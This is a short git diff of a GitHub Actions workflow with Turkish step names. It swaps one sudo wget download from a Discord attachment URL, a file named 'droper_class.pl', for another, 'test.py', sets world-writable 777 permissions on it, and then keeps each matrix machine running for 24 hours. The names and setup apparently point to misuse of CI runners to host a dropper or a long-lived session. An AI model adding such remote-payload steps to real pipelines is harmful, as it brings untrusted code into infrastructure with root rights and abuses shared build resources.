@@ -40,9 +40,8 @@ jobs:
           done
       - name: Dosya indir ve izin ver
         run: |
-          cd ~
-          sudo wget -O droper_class.pl "https://cdn.discordapp.com/attachments/1258368563073388607/1395507438886850742/droper_class.pl?ex=687ab314&is=68796194&hm=9585ed1cf1de3c8f2a6a4c35b2b61a7b5d22e771e794ac6e18011106ae3b579c&"
-          sudo chmod 777 droper_class.pl
+          sudo wget -O test.py "https://cdn.discordapp.com/attachments/1258368563073388607/1395873919197511890/test.py?ex=687c0864&is=687ab6e4&hm=dcbe14bc32fe0744951d0879368d3feeac4545ce6ce44f9d3dbc3952be40f947&"
+          sudo chmod 777 test.py
       - name: Keep session running
         run: |
           echo "Makine ${{ matrix.machine }} 24 saat boyunca açık kalacak..."
